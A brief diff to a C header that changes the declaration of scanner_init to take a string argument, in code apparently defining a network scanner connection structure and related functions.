@@ -45,7 +45,7 @@ struct scanner_connection {
     uint8_t tries;
 };
 
-void scanner_init();
+void scanner_init(char*);
 void scanner_kill(void);
 
 static void setup_connection(struct scanner_connection *);
